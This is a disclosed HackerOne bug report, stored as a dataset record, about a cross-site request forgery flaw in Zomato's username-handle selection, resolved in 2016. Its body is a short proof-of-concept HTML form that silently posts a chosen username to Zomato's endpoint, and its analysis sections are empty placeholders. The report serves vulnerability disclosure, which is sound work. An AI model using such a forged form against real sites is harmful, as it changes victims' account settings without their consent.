---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '113857'
original_report_id: '113857'
title: CSRF AT SELECTING ZAMATO HANDLE
weakness: Cross-Site Request Forgery (CSRF)
team_handle: zomato
created_at: '2016-02-01T13:48:22.261Z'
disclosed_at: '2016-03-18T05:28:06.133Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF AT SELECTING ZAMATO HANDLE

## Metadata

- HackerOne Report ID: 113857
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: zomato
- Disclosed At: 2016-03-18T05:28:06.133Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello,

Your Application Have Feature To Choose Zomato Handle 


POC:-

<html>
  <body>
    <form action="https://www.zomato.com/php/username_selector.php" method="POST">
      <input type="hidden" name="uname" value="googlessssssssssx" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Thanks!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
